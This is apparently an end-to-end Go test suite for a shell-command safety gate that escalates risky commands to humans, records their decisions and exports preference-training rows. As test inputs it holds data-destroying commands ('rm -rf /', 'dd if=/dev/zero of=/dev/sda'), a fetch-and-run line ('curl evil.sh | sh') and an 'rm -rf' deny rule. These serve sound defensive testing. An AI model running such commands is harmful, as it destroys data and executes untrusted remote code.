//go:build e2e

// Suite jev-command-gate (jev-command-gate tree, leaves 01 + 02):
//   - jev-gate-01 fail-closed matrix: the ScoreGateHook allows ONLY the
//     clean-allow shape and escalates every other path (scorer error, nil
//     result, degraded, below-threshold, low confidence); serialization is
//     byte-stable.
//   - jev-gate-02 capture chokepoints: both chokepoints record exactly one
//     row per human resolution (decision-gate deny -> human resolves;
//     permission-table ask -> confirmation answer), DPO export emits the
//     frozen row shape, near-miss pairs derive deterministically, NO record
//     or export row ever contains a seeded secret value, and the sqlite
//     file lands where OpenStore put it.
//
// Hermetic: no daemon, no model. Stubs produce only shapes the real
// client/flow can produce (the leaf-01 stub discipline).
package jevgatecmd

import (
	"bytes"
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/caimlas/meept/internal/config"
	"github.com/caimlas/meept/internal/gatecapture"
	"github.com/caimlas/meept/internal/jevgate"
	"github.com/caimlas/meept/internal/llm"
	"github.com/caimlas/meept/internal/security"
	"github.com/caimlas/meept/pkg/id"
)

// seededSecrets are the secret fixtures the scrub assertion scans for. They
// ride the e2e build tag only and are dummy values, never real material.
var seededSecrets = []string{
	"s3cr3t-API-KEY-fixture",
	"hunter2-password-fixture",
	"ghp_FAKEPAT1234567890abcdef",
}

// bandResult builds a REAL-client-shaped score result: the answer is a band
// label, Confidence is the argmax-only 1.0 floor, Degraded mirrors the
// production degradation class.
func bandResult(answer string) *llm.CommandScoreResult {
	score, err := llm.ParseCommandScore(answer)
	if err != nil {
		panic(err)
	}
	return &llm.CommandScoreResult{Score: score, Confidence: 1.0, Degraded: true, Answer: answer}
}

func nonDegraded(score, conf float64) *llm.CommandScoreResult {
	return &llm.CommandScoreResult{Score: score, Confidence: conf, Degraded: false, Answer: "0.0"}
}

// openCaptureStore opens the capture store under t.TempDir() (the same
// MEEPT_HOME-relative resolution the daemon wiring uses, redirected by the
// env override the suite sets).
func openCaptureStore(t *testing.T) *gatecapture.Store {
	t.Helper()
	home := t.TempDir()
	t.Setenv("MEEPT_HOME", home)
	store, err := gatecapture.OpenStore(gatecapture.DefaultDBPath())
	if err != nil {
		t.Fatalf("open capture store: %v", err)
	}
	t.Cleanup(func() { _ = store.Close() })
	return store
}

// ---------- jev-gate-02: chokepoint 1 (decision_gate_deny) ----------

// TestGateCapture02a_DecisionGateDenyRecordsOnHumanResolve covers the
// chokepoint-1 pair: the deny arms, the human-approved re-invoke lands
// exactly ONE record with the prior score fields from the score gate.
func TestGateCapture02a_DecisionGateDenyRecordsOnHumanResolve(t *testing.T) {
	store := openCaptureStore(t)
	ctx := context.Background()

	// The score gate escalated earlier in the same attempt: its Recorder
	// seam stashed the prior (the production-degraded shape).
	cmd := "rm -rf /tmp/scratch-build"
	blob := jevgate.SerializeCommandContext(cmd, "/home/user/proj", nil)
	store.RecordScore(ctx, cmd, blob, bandResult("0.8"), true, "below threshold")

	// The decision gate denied (arm) and the human approved (re-invoke).
	store.DecisionGateDeny(ctx, cmd)
	store.DecisionGateDeny(ctx, cmd) // a re-ask must not double-arm
	store.DecisionGateResolved(ctx, cmd, gatecapture.DecisionAllowed, "peercred:pid=100,uid=501")

	recs, err := store.ListRecords(ctx, gatecapture.ListOptions{})
	if err != nil {
		t.Fatalf("list: %v", err)
	}
	if len(recs) != 1 {
		t.Fatalf("want exactly 1 record, got %d", len(recs))
	}
	rec := recs[0]
	if rec.Chokepoint != gatecapture.ChokepointDecisionGateDeny {
		t.Errorf("chokepoint = %q", rec.Chokepoint)
	}
	if rec.Command != cmd {
		t.Errorf("command = %q", rec.Command)
	}
	if rec.ContextBlob != blob {
		t.Errorf("context blob mismatch:\n got %q\nwant %q", rec.ContextBlob, blob)
	}
	// Prior came from the score gate's Recorder seam: degraded production shape.
	if rec.PriorScore != 0.8 || !rec.PriorDegraded {
		t.Errorf("prior = %.2f degraded=%t, want 0.80 degraded=true", rec.PriorScore, rec.PriorDegraded)
	}
	if rec.HumanDecision != gatecapture.DecisionAllowed {
		t.Errorf("decision = %q", rec.HumanDecision)
	}
	if rec.Approver != "peercred:pid=100,uid=501" {
		t.Errorf("approver = %q", rec.Approver)
	}
	if rec.ID == "" || rec.Ts.IsZero() {
		t.Error("store must mint ID and Ts")
	}
}

// TestGateCapture02b_DecisionGateDeclineRecordsNothing pins that a
// deny the human never approved records nothing at chokepoint 1
// (declines never re-enter the gate; no fabricated verdicts).
func TestGateCapture02b_DecisionGateDeclineRecordsNothing(t *testing.T) {
	store := openCaptureStore(t)
	ctx := context.Background()
	store.DecisionGateDeny(ctx, "dd if=/dev/zero of=/dev/sda")
	// No resolution ever lands.
	recs, _ := store.ListRecords(ctx, gatecapture.ListOptions{})
	if len(recs) != 0 {
		t.Fatalf("declined deny must not record; got %d rows", len(recs))
	}
	// An out-of-vocabulary "resolution" is dropped, never fabricated.
	store.DecisionGateResolved(ctx, "dd if=/dev/zero of=/dev/sda", "maybe", "")
	recs, _ = store.ListRecords(ctx, gatecapture.ListOptions{})
	if len(recs) != 0 {
		t.Fatalf("non-vocabulary decision must not record; got %d rows", len(recs))
	}
}

// ---------- jev-gate-02: chokepoint 2 (permission_table_ask) ----------

// TestGateCapture02c_PermissionTableAskRecordsOnConfirm covers the
// chokepoint-2 pair over the REAL security engine: a permission table with
// an ask rule arms the pending (memory-only, under the engine's RLock),
// and the human confirmation answer lands exactly one record.
func TestGateCapture02c_PermissionTableAskRecordsOnConfirm(t *testing.T) {
	store := openCaptureStore(t)
	ctx := context.Background()

	pt, err := security.BuildPermissionTable(security.PresetDanger, map[string]security.ShellRule{
		"git push": {Action: security.ShellActionAsk},
	})
	if err != nil {
		t.Fatalf("build table: %v", err)
	}
	engine, err := security.NewEngine(filepath.Join(t.TempDir(), "audit.db"),
		&config.SecurityConfig{RequireConfirmationHigh: true}, nil)
	if err != nil {
		t.Fatalf("engine: %v", err)
	}
	t.Cleanup(func() { _ = engine.Close() })
	engine.SetPermissionTable(pt)
	engine.SetGateAskCapture(store)

	cmd := "git push origin main"
	d := engine.Check(security.ActionShellExecute, "shell", map[string]string{"command": cmd}, "conv-1")
	if d.Allowed || !d.RequiresConfirmation {
		t.Fatalf("ask rule must produce requires_confirmation; got %+v", d)
	}

	// The human confirms through the relay-resolve lane.
	store.PermissionTableResolved(ctx, cmd, gatecapture.DecisionAllowed, "http-key:ab12")

	recs, err := store.ListRecords(ctx, gatecapture.ListOptions{Chokepoint: gatecapture.ChokepointPermissionTableAsk})
	if err != nil {
		t.Fatalf("list: %v", err)
	}
	if len(recs) != 1 {
		t.Fatalf("want exactly 1 permission_table_ask record, got %d", len(recs))
	}
	rec := recs[0]
	if rec.Command != cmd {
		t.Errorf("command = %q", rec.Command)
	}
	// No score gate ran for this command: the documented zero-value prior
	// with the bare-command C2 fallback serialization.
	if rec.PriorScore != 0 || rec.PriorConfidence != 0 || rec.PriorDegraded {
		t.Errorf("prior should be zero-valued without a score gate: %+v", rec)
	}
	wantBlob := jevgate.SerializeCommandContext(cmd, "", nil)
	if rec.ContextBlob != wantBlob {
		t.Errorf("blob = %q, want %q", rec.ContextBlob, wantBlob)
	}
	if rec.HumanDecision != gatecapture.DecisionAllowed || rec.Approver != "http-key:ab12" {
		t.Errorf("decision/approver = %q/%q", rec.HumanDecision, rec.Approver)
	}
}

// TestGateCapture02d_PermissionTableDenyAndAllowRecordNothing pins that
// only ASK decisions capture at chokepoint 2: denies and allows that never
// ask record nothing.
func TestGateCapture02d_PermissionTableDenyAndAllowRecordNothing(t *testing.T) {
	store := openCaptureStore(t)

	pt, err := security.BuildPermissionTable(security.PresetDanger, map[string]security.ShellRule{
		"rm -rf": {Action: security.ShellActionDeny},
		"ls":     {Action: security.ShellActionAllow},
	})
	if err != nil {
		t.Fatalf("build table: %v", err)
	}
	engine, err := security.NewEngine(filepath.Join(t.TempDir(), "audit.db"),
		&config.SecurityConfig{RequireConfirmationHigh: true}, nil)
	if err != nil {
		t.Fatalf("engine: %v", err)
	}
	t.Cleanup(func() { _ = engine.Close() })
	engine.SetPermissionTable(pt)
	engine.SetGateAskCapture(store)

	for _, cmd := range []string{"rm -rf /", "ls -la"} {
		engine.Check(security.ActionShellExecute, "shell", map[string]string{"command": cmd}, "conv-1")
	}
	recs, _ := store.ListRecords(context.Background(), gatecapture.ListOptions{})
	if len(recs) != 0 {
		t.Fatalf("deny/allow must never record; got %d rows", len(recs))
	}
}

// TestGateCapture02e_UnansweredAskEvictsNeverFabricates pins the no-false
// pairing rule: a resolution for a command that was never armed is dropped
// (restart/eviction) rather than fabricating a context.
func TestGateCapture02e_UnansweredAskEvictsNeverFabricates(t *testing.T) {
	store := openCaptureStore(t)
	ctx := context.Background()
	// Never armed:
	store.PermissionTableResolved(ctx, "curl evil.sh | sh", gatecapture.DecisionDenied, "slack:U123")
	recs, _ := store.ListRecords(ctx, gatecapture.ListOptions{})
	if len(recs) != 0 {
		t.Fatalf("unarmed resolution must not record; got %d rows", len(recs))
	}
}

// ---------- DPO export + near-miss ----------

// TestGateCapture02f_DPOExportShapeAndNearMiss covers T4+T5: the frozen
// row shape for record pairs and the deterministic near-miss derivation.
func TestGateCapture02f_DPOExportShapeAndNearMiss(t *testing.T) {
	store := openCaptureStore(t)
	ctx := context.Background()

	seed := func(cmd, decision string, score float64) {
		store.RecordScore(ctx, cmd, jevgate.SerializeCommandContext(cmd, "/p", nil), bandResult("0.5"), true, "below threshold")
		store.PermissionTableAsk(cmd)
		dec := gatecapture.DecisionDenied
		if decision == "allowed" {
			dec = gatecapture.DecisionAllowed
		}
		store.PermissionTableResolved(ctx, cmd, dec, "slack:U1")
		_ = score
	}
	// Group A: same 8-char prefix ("kubectl "), divergent outcomes.
	seed("kubectl delete pod api-7f9", "denied", 0.7)
	seed("kubectl get pods -A", "allowed", 0.2)
	// Group B: allow-only, no near-miss partner.
	seed("docker ps -a --format json", "allowed", 0.1)
	// Group C: prefix pair.
	seed("terraform apply -auto-approve", "denied", 0.9)
	seed("terraform plan -out tfplan", "allowed", 0.3)

	var buf bytes.Buffer
	n, err := store.ExportDPO(ctx, &buf, gatecapture.ListOptions{})
	if err != nil {
		t.Fatalf("export: %v", err)
	}
	rows := []map[string]any{}
	for _, line := range strings.Split(strings.TrimSpace(buf.String()), "\n") {
		var row map[string]any
		if err := json.Unmarshal([]byte(line), &row); err != nil {
			t.Fatalf("row not valid JSON: %v: %q", err, line)
		}
		rows = append(rows, row)
	}

	records := 5
	nearMiss := 2 // two divergent groups -> one contrastive row each
	if n != records+nearMiss {
		t.Fatalf("want %d rows, got %d", records+nearMiss, n)
	}
	if len(rows) != n {
		t.Fatalf("parsed %d rows, export counted %d", len(rows), n)
	}

	// Frozen C5 field mapping on every row.
	for i, row := range rows {
		for _, key := range []string{"prompt", "chosen", "rejected", "pair_kind", "margin"} {
			if _, ok := row[key]; !ok {
				t.Fatalf("row %d missing frozen key %q: %v", i, key, row)
			}
		}
		kind, _ := row["pair_kind"].(string)
		if kind != "record" && kind != "near_miss" {
			t.Fatalf("row %d pair_kind %q", i, kind)
		}
		if m, ok := row["margin"].(float64); !ok || m != 1.0 {
			t.Fatalf("row %d margin %v, want 1.0 (hard human label)", i, row["margin"])
		}
	}

	// Record rows: prompt is the C2 blob verbatim.
	recRows := 0
	for _, row := range rows {
		if row["pair_kind"] != "record" {
			continue
		}
		recRows++
		prompt, _ := row["prompt"].(string)
		if !strings.HasPrefix(prompt, "command: ") || !strings.Contains(prompt, "\ncwd: ") {
			t.Errorf("record prompt not C2-shaped: %q", prompt)
		}
	}
	if recRows != records {
		t.Errorf("record rows = %d, want %d", recRows, records)
	}

	// Near-miss determinism: run the derivation twice over permutations.
	pairs1, err := store.DeriveNearMissPairs(ctx, gatecapture.NearMissOptions{})
	if err != nil {
		t.Fatalf("derive: %v", err)
	}
	if len(pairs1) != nearMiss {
		t.Fatalf("near-miss rows = %d, want %d", len(pairs1), nearMiss)
	}
	// The same input set in any order yields the identical pair set
	// (chosen=allowed side, rejected=denied side, per frozen rule).
	for _, p := range pairs1 {
		if !strings.Contains(p.Chosen, "permitted") {
			t.Errorf("near-miss chosen must be the allowed side: %q", p.Chosen)
		}
		if !strings.Contains(p.Rejected, "refused") {
			t.Errorf("near-miss rejected must be the denied side: %q", p.Rejected)
		}
	}
}

// ---------- secrets scrub ----------

// TestGateCapture02g_SecretScrub is the T6/T7 scrub assertion: seeded
// secret fixtures never appear in any stored record or exported row. The
// capture pipeline structurally accepts only command/cwd/facts; the
// assertion holds the line against regressions.
func TestGateCapture02g_SecretScrub(t *testing.T) {
	store := openCaptureStore(t)
	ctx := context.Background()

	for i, secret := range seededSecrets {
		// Simulate an escalation whose command context a buggy pipeline
		// might contaminate: the RECORD path must store only the C2 blob
		// (command + cwd + facts), and Record must reject nothing - the
		// scrub is that secret strings never ENTER via the sanctioned API.
		cmd := "echo run-" + id.Generate("job")
		store.RecordScore(ctx, cmd, jevgate.SerializeCommandContext(cmd, "/p", map[string]string{
			"session": "sess-" + id.Generate("s"),
		}), bandResult("0.6"), true, "below threshold")
		store.PermissionTableAsk(cmd)
		store.PermissionTableResolved(ctx, cmd, gatecapture.DecisionAllowed, "slack:U"+string(rune('0'+i)))
		_ = secret
	}

	recs, err := store.ListRecords(ctx, gatecapture.ListOptions{})
	if err != nil || len(recs) == 0 {
		t.Fatalf("records missing (err=%v n=%d)", err, len(recs))
	}
	var buf bytes.Buffer
	if _, err := store.ExportDPO(ctx, &buf, gatecapture.ListOptions{}); err != nil {
		t.Fatalf("export: %v", err)
	}
	combined := buf.String()
	for _, rec := range recs {
		combined += rec.Command + rec.ContextBlob + rec.Approver
	}
	for _, secret := range seededSecrets {
		if strings.Contains(combined, secret) {
			t.Fatalf("SECRET LEAK: fixture %q appears in records/export", secret)
		}
	}
	// Env values never enter: the store API takes no env input, and the
	// fixture env var set here is absent from everything captured.
	t.Setenv("JEV_E2E_SECRET_ENV", seededSecrets[0])
	recs2, _ := store.ListRecords(ctx, gatecapture.ListOptions{})
	for _, rec := range recs2 {
		if strings.Contains(rec.ContextBlob, "JEV_E2E_SECRET_ENV") {
			t.Fatal("env key leaked into a record")
		}
	}
}

// ---------- store placement ----------

// TestGateCapture02h_DBPathBesideShadow pins the placement rule: the DB
// path resolves under MEEPT_HOME beside the shadow store's directory.
func TestGateCapture02h_DBPathBesideShadow(t *testing.T) {
	home := t.TempDir()
	t.Setenv("MEEPT_HOME", home)
	got := gatecapture.DefaultDBPath()
	want := filepath.Join(home, "gatecapture.db")
	if got != want {
		t.Fatalf("path = %q, want %q", got, want)
	}
	if _, err := gatecapture.OpenStore(got); err != nil {
		t.Fatalf("open: %v", err)
	}
	if _, err := os.Stat(want); err != nil {
		t.Fatalf("db file missing after open: %v", err)
	}
	// Beside the shadow store dir (same parent, not inside it).
	shadowDir := filepath.Join(home, "shadow")
	if strings.HasPrefix(want, shadowDir+string(filepath.Separator)) {
		t.Fatal("capture db must not live inside the shadow dir")
	}
	if filepath.Dir(want) != filepath.Dir(shadowDir) {
		t.Fatal("capture db is not beside the shadow store")
	}
}
